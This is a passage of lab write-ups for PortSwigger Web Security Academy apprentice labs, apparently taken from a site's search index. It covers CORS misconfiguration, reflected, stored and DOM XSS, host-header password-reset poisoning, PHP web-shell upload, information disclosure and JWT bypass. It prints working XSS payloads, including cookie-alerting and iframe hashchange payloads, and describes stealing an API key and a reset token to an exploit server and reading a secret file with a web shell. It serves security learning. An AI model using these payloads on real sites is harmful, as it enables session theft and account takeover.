</ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration_4","title":"Enumeration","text":"<ul> <li>We are given the website below, as can be seen, there is nothing special in the 'View details' function and hence we will focus on \"My account\" function.</li> </ul> <ul> <li>\"My account\" function brings us to a login page where we login with our credentials <code>wiener:peter</code>.</li> </ul> <ul> <li>We are then greeted with a page below that reveals an API key.</li> </ul> <ul> <li>From the HTML, we can see that the API key details is fetched by a script from <code>/accountDetails</code> directory.</li> </ul> <ul> <li>Chronologically, we can see that there are 2 <code>GET</code> requests made after the login <code>POST</code> request.</li> </ul> <ul> <li>Looking at the 2 <code>GET</code> requests' repsonse <code>/my-account</code> and <code>/accountDetails</code> we can see that there is nothing special with the <code>/my-account</code> reponse but <code>/accountDetails</code> reponse gives a header with <code>Access-Control-Allow-Credentials: true</code> which is a CORS functionality.</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Hence we send this to Burp Repeater to try if there will be further server repsonse if we add an origin.</li> </ul> <ul> <li>Indeed, <code>Access-Control-Allow-Origin: true</code> is returned, and we now know CORS vulnerability exists.</li> <li>On the exploit server we added the following javascript</li> </ul> <ul> <li>We can understand more about the exploit code from here.</li> <li>this exploit assumes that when exploit is sent to victim, victim will click on to the link and follow to our exploit webserver.</li> <li>This javascript from the exploit webserver will do a <code>GET</code> request to the vulnerable web server. <code>req.withCredentials()</code> is to make sure that <code>cross-site Access-Control</code> is set to <code>true</code>.</li> <li><code>reqListener()</code> will obtain the reponse body and send it to access log of exploit server.</li> </ul> <ul> <li>As can be seen above, sensitive information is leaked.</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#cors-vulnerability-with-trusted-null-origin","title":"CORS vulnerability with trusted null origin","text":"<ul> <li>This website has an insecure CORS configuration in that it trusts the <code>null</code> origin.</li> <li>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration_5","title":"Enumeration","text":"<ul> <li>Webpage is similar to #CORS vulnerability with basic origin reflection where the difference is in the value of <code>Origin:</code> header.</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>As can be seen above, when <code>Origin:</code> is a webpage, \"Access-Control\" is not enabled, but if <code>Origin:</code> is <code>null</code>, \"Access-Control\" is enabled.</li> </ul> <ul> <li>We sent the same script (different url) as the one in #CORS vulnerability with basic origin reflection but as can be seen above we do not get the desired result.</li> <li>There could be some defences employed in the victim's site similar to #Clickjacking with a frame buster script.</li> <li>Hence we add an HTML iframe sandbox to \"allow script\" like below.</li> </ul> <ul> <li>We check the access log again and we get the credentials.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/","title":"Cross Site Scripting","text":""},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#reflected-xss-into-html-context-with-nothing-encoded","title":"Reflected XSS into HTML context with nothing encoded","text":""},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#enumeration","title":"Enumeration","text":"<ul> <li>Given this website to test. </li> <li>There are only a few functions : Search Box, Home button and View Post.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>As this is a reflected XSS lab, it is likely that input is needed and it is transient (not persistent) hence the first input we can test here is the search box.</li> <li>String is rendered normally when normal input is given.   </li> <li>Adding <code>&lt;h1&gt;aa&lt;/h1&gt;</code> gives us below where the HTML is rendered with <code>H1</code> heading.  </li> <li>With the above information we know that the search box field is vulnerable to Reflected XSS.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#exploitation","title":"Exploitation","text":"<ul> <li>To do an <code>alert()</code> we will need to encode the html with <code>&lt;script&gt;&lt;/script&gt;</code> hence the injection string will be  <pre><code>&lt;script&gt;alert('aa')&lt;/script&gt;\n</code></pre> </li> <li>There we have it an alert.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#stored-xss-into-html-context-with-nothing-encoded","title":"Stored XSS into HTML context with nothing encoded","text":""},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given a website below which only has multiple posts.  </li> <li>We find that within each post there is a comment section.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#vulnerability-assessment_1","title":"Vulnerability Assessment","text":"<ul> <li>As this lab is about Stored XSS, there must be fields that can be stored and we can turn our attention to the comment section.</li> <li>Seems like there is some input sanitation for Email and Website fields.  </li> <li>Hence the parameters to test will be <code>Comment</code> and <code>Name</code> field.  </li> <li>So it seems like the <code>Name</code> field is not vulnerable but the <code>Comment</code> field is. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#exploitation_1","title":"Exploitation","text":"<ul> <li>Hence we can submit a request like below :  </li> <li>And there we have it stored XSS.  </li> <li>As this is stored XSS, as long as the comment is there, any user that visits the page will receive the pop-up.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#reflected-xss-into-attribute-with-angle-brackets-html-encoded","title":"Reflected XSS into attribute with angle brackets HTML-encoded","text":""},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#enumeration_2","title":"Enumeration","text":""},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#vulnerability-assessment_2","title":"Vulnerability Assessment","text":"<ul> <li>From the above enumeration, we can see that there is some input sanitization where <code>&lt;&gt;</code> are changed to <code>&amp;lt;</code> and <code>&amp;gt;</code> respectively. Hence adding angle brackets will not work.</li> <li>We do notice however, that adding <code>\"\"</code> appropriately can trigger the javascript behind the form. </li> <li>Hence our payload : <pre><code>\"onclick=\"alert(1)\n</code></pre></li> <li>We can use the event attributes here and trigger the XSS as per the attribute  used. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded","title":"Stored XSS into anchor href attribute with double quotes HTML-encoded","text":"<ul> <li>This lab contains a stored cross-site scripting vulnerability in the comment functionality. </li> <li>To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#enumeration_3","title":"Enumeration","text":"<ul> <li>There is some form of input sanitization.</li> </ul> <p>  - We see that the author's name linked with a <code>href</code> link which is the website field.  </p>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#vulnerability-assessment_3","title":"Vulnerability Assessment","text":"<ul> <li>Inserting <code>&lt;script&gt;alert()&lt;/script&gt;</code> to the website field does ot seem to work </li> <li>With reference to this link we can try <code>javascript:alert(1)</code> </li> <li>And the javascript is executed.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded","title":"Reflected XSS into a JavaScript string with angle brackets HTML encoded","text":"<ul> <li>This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. </li> <li>The reflection occurs inside a JavaScript string. </li> <li>To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#enumeration_4","title":"Enumeration","text":"<ul> <li>Went to the search box and typed 'aaaa' </li> <li>Inspect source and realised that there is a <code>&lt;script&gt;&lt;/script&gt;</code> section where input 'aaaa' is also present. Hence we need to manipulate this input and have <code>document.write</code> execute the manipulated input. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Cross%20Site%20Scripting/#vulnerability-assessment_4","title":"Vulnerability Assessment","text":"<ul> <li>Payload used :  <pre><code>';&lt;img src=1 onerror=alert()&gt;'\n</code></pre></li> <li>But the result is encoded hence reflected XSS will not work. </li> <li>We use another payload  <pre><code>'-alert()-'\n</code></pre></li> <li>As we can see below, <code>alert()</code> is triggered. </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/","title":"DOM based XSS","text":""},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#what-is-dom","title":"What is DOM?","text":"<ul> <li>Based on this link and this portswigger link will explain what HTML sink is.</li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#dom-xss-in-documentwrite-sink-using-source-locationsearch","title":"DOM XSS in <code>document.write</code> sink using source <code>location.search</code>","text":""},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#enumeration","title":"Enumeration","text":"<p>Step 1: Randomly type a string to get a search result  Step 2: go to inspect source and we find the script responsible for the <code>'aaaa'</code> we find that there is a <code>document.write()</code> |</p>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li> <p>From the highlighted statement above, we know that the <code>query</code> is the entry point for injection. Hence we will need to craft a payload and do a search based on where query is.  </p> </li> <li> <p>The goal of this lab is to issue an <code>alert()</code> statement hence we will simply edit the payload accordingly to <code>\"&gt;&lt;svg onload=alert(1)&gt;</code> which will result in the query below : </p> </li> </ul> <pre><code>document.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+\"&gt;&lt;svg onload=alert(1)&gt;+'\"&gt;');\n</code></pre> <ul> <li>What happened here is that a svg (scalable vector graphic) is created at runtime and loaded beside <code>img src</code> which was closed. Upon loading, <code>alert()</code> function will be called. </li> </ul> <p></p>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#dom-xss-in-innerhtml-sink-using-source-locationsearch","title":"DOM XSS in innerHTML sink using source location.search","text":""},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#enumeration_1","title":"Enumeration","text":"<p>Step 1: Randomly type a string to get a search result  Step 2: Inspect Page source to see what is the script behind it. </p>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#vulnerability-assessment_1","title":"Vulnerability Assessment","text":"<ul> <li>From this linkwe understand how <code>innerHTML</code> XSS works.</li> <li>The goal of this lab is to issue an <code>alert()</code> statement thus our payload will be as such : <code>&lt;img src=1 onerror=alert('1')&gt;</code> which will make the statement look like :  <pre><code>   document.getElementById('searchMessage').innerHTML = `&lt;img src=1 \n   onerror=alert('1')&gt;`;\n</code></pre> </li> <li>XSS is executed, as there is no such image and hence on error, the alert box will be executed. </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source","title":"DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source","text":""},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#enumeration_2","title":"Enumeration","text":"<ul> <li>URL before submission </li> <li>There is input sanitization. </li> <li>There is response when sending feedback. </li> <li>The url when feedback is submitted </li> <li>Probable vulnerable jQuery </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#vulnerability-assessment_2","title":"Vulnerability Assessment","text":"<ul> <li>We can attempt to test the vulnerability based on how this link does it.</li> <li>Payload used :  <pre><code>?returnPath=javascript:alert('1')\n</code></pre></li> <li>After the payload is sent, we will need to click <code>Back</code> for the <code>alert()</code> to show. </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#exploitation","title":"Exploitation","text":"<ul> <li>The objective of this lab is make the \"back\" link alert <code>document.cookie</code>. </li> <li>Change the payload to : <pre><code>javascript:alert(document.cookie)\n</code></pre> </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#dom-xss-in-jquery-selector-sink-using-a-hashchange-event","title":"DOM XSS in jQuery selector sink using a hashchange event","text":"<ul> <li>The URL hash is everything that follows the pound sign (#) in the URL. The <code>hashchange</code> event activates when the URL hash changes from one to another. </li> </ul> <p>Example of <code>hashchange</code>:  From:  <code>url.com/#header</code> To: <code>url.com/#footer</code> </p> <ul> <li> <p>This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's <code>$()</code> selector function to auto-scroll to a given post, whose title is passed via the <code>location.hash</code> property.</p> </li> <li> <p>To solve the lab, deliver an exploit to the victim that calls the <code>print()</code> function in their browser. </p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#enumeration_3","title":"Enumeration","text":"<ul> <li>From the inspect page source, we can see the vulnerable jQuery function.</li> </ul> <ul> <li>We can see that when there is a <code>hashchange</code>, it will call a <code>function()</code> which will check if the hash component contains values the are part of the  <code>&lt;h2&gt;</code> heading in the list below. If it exists, it will scroll to the post.</li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#vulnerability-assessment_3","title":"Vulnerability Assessment","text":"<ul> <li>To exploit this, we can intercept the response and modify this function to trigger something when there is a <code>hashchange</code>. </li> <li>From above, we can added  <pre><code>console.log('test function');\n</code></pre></li> <li>As we can see below, <code>test function</code> is called when hash changes from <code>Identit</code> to <code>Ident</code>.  </li> <li>Another means where we can deliver the exploit is through the URI. When hashchange occurs, the value of the hash that changed is parsed into <code>decodeURIComponent</code>. Hence we can deliver the exploit through the URI. </li> <li>We can test this out by appending the payload  <pre><code>&lt;img src=1 onerror=alert('1')&gt;\n</code></pre></li> <li>which will result in the jQuery   </li> <li>As can be seen above, an alert popped up. </li> </ul>"},{"location":"Burp_Academy/Apprentice/DOM-based%20XSS/#exploitation_1","title":"Exploitation","text":"<ul> <li>However, there is a problem. The payload above will not work directly on a victim's browser as to the victim, there is no change in hash. Hence we will need to invoke a <code>hashchange</code> for it to work. Additionally, we will also need to  call the <code>print()</code> function.</li> <li>Since the input is a HTML string, we can make use of the <code>iframe</code> HTML tag which embeds another document.</li> <li>The idea is to use the <code>iframe</code> to load the webpage with one hash and in the same frame load the URL with the payload thus invoking a <code>hashchange</code>.</li> <li>Payload to use will be : <pre><code>&lt;iframe src=\"https://0a3f000403f29a80c05636c400ae007e.web-security-academy.net/#1234\" onload=\"this.src = this.src + '&lt;img src=a onerror=print()&gt;'\"/&gt;\n</code></pre> As can be seen below, the <code>iframe</code> is invoked and <code>print()</code> function is called. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/","title":"HTTP Host Header Attacks &amp; File Upload Vulnerabilities","text":""},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#http-host-header-attacks","title":"HTTP Host Header Attacks","text":"<ul> <li>More on host header can be understood here and testing for host header vulnerabilities can be understood here.</li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#basic-password-reset-poisoning","title":"Basic Password Reset Poisoning","text":"<ul> <li>This lab is vulnerable to password reset poisoning. The user <code>carlos</code> will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code>. Any emails sent to this account can be read via the email client on the exploit server. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#enumeration","title":"Enumeration","text":"<ul> <li>As this is a password reset challenge, we will skip the thorough mapping of the website. Below is the \"Home\" page.   We attempted to login with the credentials given and we get to the <code>my-account</code> page below. Which does not seem to have anything special. </li> <li>Next we try the \"Forgot password\" button which brings us to this link. We supply it with <code>wiener</code> as the user and we get the email that can be seen below.  </li> <li>We notice that <code>/forgot-password</code> is a POST request and passes the username in the body.   </li> <li>As we can see from the link, a unique token is generated for each reset and it is passed in as a parameter <code>?temp-forgot-password-token=&lt;token&gt;</code> to <code>/forget-password</code> .</li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We visited the page and intercepted the POST request of the password reset page.  </li> <li>Initially, we thought that there was someting special in the cookie. But upon decoding with cyberchef, we did not see anything that is of note. </li> <li>So next we will test the HTTP Host Header. Based on the above link for testing HTTP Host Header vulnerabilities, we will now add a abitrary value to the Host Header and check what happens.  </li> <li>It seems like the reset email is still sent and we see that the link for password reset is <code>google.com</code> appended with the <code>/forgot-password?temp-forgot-password-token=&lt;token&gt;</code> query.</li> <li>The next step will be to trick user <code>carlos</code> into clicking on the reset email and steal his token.</li> <li>This can be done by changing the body parameter of the <code>forgot-password</code> POST request to <code>carlos</code> and Host Header to the exploit server host name, and when <code>carlos</code> clicks on the link, he will make a request to the exploit server with the token in his GET request.  </li> <li>As we can see above, in the access log of the exploit server, we can see that there is a error 404 request to <code>/forgot-password</code> with the token appended. </li> <li>We solve the challenge by logging into carlos with the new password <code>peter1</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#host-header-authentication-bypass","title":"Host Header Authentication Bypass","text":"<ul> <li>This lab makes an assumption about the privilege level of the user based on the HTTP Host header.</li> <li>To solve the lab, access the admin panel and delete Carlos's account. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given a website below, but we do not have any credentials.  </li> <li>It is evident that we are unable to login with the usual credentials <code>wiener:peter</code>. </li> <li>Going into the details of the posts product does not give us valuable information.</li> <li>We attempt to see if the page has <code>robots.txt</code>.  </li> <li>As can be seen above, <code>robots.txt</code> reveals that there is an admin panel which can be seen below. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>The clue given by the error message above is that the interface is only available for local users.</li> <li>The original GET request is as such. </li> <li>Hence we used Burp Repeater and modified the Host Header to <code>localhost</code>. </li> <li>As can be seen below, we succesfully logged into the adminsitrator panel. </li> <li>We can proceed to delete <code>carlos</code> to solve the challenge. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#file-upload-vulnerabilities","title":"File Upload Vulnerabilities","text":""},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#rce-via-webshell-upload","title":"RCE via Webshell Upload","text":"<ul> <li>This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.</li> <li>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#enumeration_2","title":"Enumeration","text":"<ul> <li>First we will need to do some webserver enumeration. Using wappalyzer we find out that PHP is used and the webserver running is Apache on a Linux distribution Ubuntu.  </li> <li>Next we login with the credentials given and we are greeted with a page that allows us to upload an image for our avatar. </li> <li>We check if there is any restriction to content by uploading a <code>test.txt</code>file. </li> <li>The file was sucessfully uploaded and it seems like the server is executing the file.  </li> <li>Below, we can see the directory to the resource <code>/files/avatars/</code> </li> <li>We are able to visit the page where <code>test.txt</code> was uploaded. </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#vulnerability-assessment-exploitation_2","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Therefore, we send the POST request responsible for uploading to Burp Repeater and injected a PHP one liner execution shell running OS command <code>whoami</code>. </li> <li>We continue to query the directory where the php shell is located and now we know that the user account that is behind this web instance is <code>carlos</code>. </li> <li>We do the same as above, just that we changed the command to <code>cat /home/carlos/secret</code> to read the secret file we are supposed to find. </li> <li>We get the secret code and submitted it.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#web-shell-upload-via-content-type-restriction-bypass","title":"Web shell upload via Content-Type restriction bypass","text":"<ul> <li> <p>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.</p> </li> <li> <p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret using the button provided in the lab banner.</p> </li> <li> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#enumeration_3","title":"Enumeration","text":"<ul> <li>The first few steps of enumeration is the same as the above Lab, and we are then given this login page upon logging in with the correct credentials. </li> <li>Attempted to upload <code>test.txt</code> and <code>websh.php</code> but there seem to be some file checking in place thus preventing the upload.   </li> </ul>"},{"location":"Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/#vulnerability-assessment-exploitation_3","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Upon closer inpection at the POST request, we realise that the check is done using the <code>Content-Type</code> header.</li> <li>Hence to bypass this, we intercepted the POST request and changed the <code>Content-Type</code> to the <code>Content-Type</code> that the server accepts <code>image/jpeg</code> and <code>test.txt</code> was sucessfully uploaded in the <code>/files/avatars</code> directory. </li> <li>Then we continue to upload <code>websh.php</code> which does a <code>shell_exec('whoami')</code> and the user that it is running as is <code>carlos</code> </li> <li>Next we upload the websh.php with the one liner that does <code>cat /home/carlos/secret</code>. </li> <li>Execute it and we obtain the secret code for submission.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/","title":"Information Disclosure","text":"<ul> <li>Accidental information disclosure by developers provide a wealth of information for pentesters. As such, there are certain enumeration steps we can take to try and find if there is such information disclosed.</li> <li>More on information disclosure can be found here.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#information-disclosure-in-error-messages","title":"Information disclosure in error messages","text":"<ul> <li>This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#enumeration","title":"Enumeration","text":"<ul> <li>We are given a page like below. </li> <li>Does not contain anything interesting and the HTTP traffic intercepted did not show anything that is interesting. </li> <li>Therefore the only way we can induce error would be to go to a product and key in an incorrect parameter. </li> <li>As can be seen below, the vulnerable Apache version is revealed and with the verbose output we also know that Java is used at the backend.   </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#information-disclosure-on-debug-page","title":"Information disclosure on debug page","text":"<ul> <li>This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given a webpage below and it seems like there is not much functions to it.  </li> <li>Webpage does not seem to have any <code>robots.txt</code>. </li> <li>However, when we view source, we notice a comment with reference to a phpinfo page. </li> <li>We visited the directory and found the phpinfo page  </li> <li>Searched for <code>SECRET_KEY</code> in the environment variable table. </li> <li>Submitted the <code>SECRET_KEY</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#source-code-disclosure-via-backup-files","title":"Source code disclosure via backup files","text":"<ul> <li>This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#enumeration_2","title":"Enumeration","text":"<ul> <li>We are given a webpage like below, does not look like it has anything special in the home and product page.  </li> <li>The page source shows that there are directories that can be directly accessed. </li> <li>We check if there is <code>robots.txt</code> and there is. <code>robots.txt</code> shows that there is a disallowed directory called <code>/backup</code>.  </li> <li>Gobuster output confirms the existence of <code>/backup</code>. </li> <li>We visit the /<code>backup</code> page and it is a web index with a file named <code>ProductTemplate.java.bak</code>. which seems like a backup file.  </li> <li>Upon inspection of the file, we see that it is a backup source code that displays product.</li> <li>We can focus more on <code>readObject</code> function which contains a declaration of a <code>connectionBuilder</code> object. </li> <li>The parameters passed into the object are <code>postgresql</code>, <code>localhost</code>, <code>5432</code> and <code>oi8qw3vzd5yjvwd2l5c5equzlwupo9vh</code>.</li> <li>These parameters seems to be the hard-coded configuration to connect to the database (postgresql in localhost and at port 5432) <code>oi8qw3vzd5yjvwd2l5c5equzlwupo9vh</code> is the database password. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#authentication-bypass-via-information-disclosure","title":"Authentication bypass via information disclosure","text":"<ul> <li> <p>This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.</p> </li> <li> <p>To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account. You can log in to your own account using the following credentials: <code>wiener:peter</code>. </p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#enumeration_3","title":"Enumeration","text":"<ul> <li>We are given the website as below. The products and the webpage itself as well as their HTML source did not have anything interesting   </li> <li>We go a step further to enumerate HTTP methods used by the web server, we have written a script to manually test each HTTP methods (nmap can be used to do this as well) :</li> </ul> <pre><code>import requests\nfrom bs4 import BeautifulSoup\n\nHTTP_Methods = ['GET','POST','TRACE','OPTIONS','PUT','DELETE','CONNECT','HEAD']\n\nfor i in HTTP_Methods:\n        response = requests.request(i, 'https://0a97005a039d3ab9c0bd9ef2001e006c.web-security-academy.net/')\n        soup = BeautifulSoup(response.text, 'html.parser') \n        print('Method Used: ' + i + '\\n' + '-'*20)\n        print(soup.prettify())\n</code></pre> <p> - From the <code>TRACE</code> request we realise that there is a <code>X-Custom-IP-Authorization</code> header which points to our own IP address.</p>"},{"location":"Burp_Academy/Apprentice/Information%20Disclosure/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Hence it seems like this <code>X-Custom-IP-Authorization</code> header is used to determine whether the request is made from localhost or remote host. </li> <li>Using Burp Repeater, we repeated the HTTP requests with the new header like below and we managed to bypass the Header Authentication.  </li> <li>We can make use of Burp Proxy Options \"Match and Replace\" to constantly add the header into our future requests.  </li> <li>We remove carlos to complete the lab. </li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/","title":"JWT","text":"<ul> <li>JWT stands for JSON Web Token.</li> <li>Basics of JWT is explained here and the use of burp suite to work with JWT is explained here. </li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/#jwt-authentication-bypass-via-unverified-signature","title":"JWT authentication bypass via unverified signature","text":"<ul> <li>This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.</li> <li>To solve the lab, modify your session token to gain access to the admin panel at <code>/admin</code>, then delete the user <code>carlos</code>. You can log in to your own account using the following credentials: <code>wiener:peter</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/#enumeration","title":"Enumeration","text":"<ul> <li>As this challenge is access-token challenge, we will jump straight to login page and login with the given credentials <code>wiener:peter</code>.</li> </ul> <ul> <li>Upon logging in we are given a <code>/my-account</code> page like below.</li> </ul> <ul> <li>we attempted to access the admin interface with peter's account but is given the following page.</li> </ul> <ul> <li>We analyse the HTTP traffic and we realise that after login success we are given a response with a <code>set-cookie</code> like below.</li> </ul> <ul> <li>The cookie value looks like that of a JWT encoded in base64 and it seems to be used as an authentication mechanism.</li> </ul> <ul> <li>The decoded cookie value is show below.</li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>As can be seen above, the value <code>\"sub\"</code> is <code>wiener</code>. It might possibly be used as the identifier for the account used.</li> </ul> <ul> <li>We can try this by sending the <code>GET</code> request for <code>/my-account</code> to burp repeater highlight the relevat text to edit and use the inspector tab to edit <code>\"sub\" : \"wiener\"</code> to <code>\"sub\" : \"administrator\"</code> like above. </li> </ul> <ul> <li>As can be seen, we are now logged in as an administrator. From burp repeater we go to the <code>GET</code> request and right click to choose \"request in browser\".</li> </ul> <p>  - We go to burp proxy, \"Match and Replace\" and then put the cookie value that we want to match and replace.  - When rule is enabled, we can simply delete carlos from the admin panel</p> <p></p>"},{"location":"Burp_Academy/Apprentice/JWT/#jwt-authentication-bypass-via-flawed-signature-verification","title":"JWT authentication bypass via flawed signature verification","text":"<ul> <li>This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.</li> <li>To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given a webpage like below : </li> </ul> <ul> <li>In similar vein to the challenge above, we will skip straight to the login page and the analysis of the login function. We login with the credentials given below.</li> </ul> <ul> <li>We are sent to this <code>/my-account</code> page.</li> </ul> <ul> <li>And it seems like we are not able to log in as administrator as there seem to be some checks.</li> </ul> <ul> <li>We analyse the HTTP traffic and we see that there is 